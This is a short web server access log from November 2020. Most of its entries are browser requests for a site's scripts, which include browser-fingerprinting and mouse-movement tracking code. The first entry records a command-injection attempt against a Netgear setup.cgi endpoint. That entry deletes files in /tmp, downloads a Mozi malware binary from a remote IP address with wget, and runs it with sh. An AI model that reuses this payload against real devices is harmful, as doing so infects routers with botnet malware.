- - [26/Nov/2020:07:00:04 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.223.12.183:54430/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [26/Nov/2020:07:30:19 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:19 +0000] "GET /css/main.css HTTP/1.1" 200 738 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:19 +0000] "GET /js/initialise_vars.js HTTP/1.1" 200 599 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:20 +0000] "GET /js/cookies_functions.js HTTP/1.1" 200 834 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:20 +0000] "GET /js/fingerprint_browser.js HTTP/1.1" 200 1048 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:20 +0000] "GET /js/mousemove_onclick.js HTTP/1.1" 200 398 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:20 +0000] "GET /js/mousemove_ontimeout.js HTTP/1.1" 200 1261 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:20 +0000] "GET /favicon.ico HTTP/1.1" 200 399 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:21 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
- - [26/Nov/2020:07:30:22 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" 0pe4qdimjjcomlurpgml7o098t "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
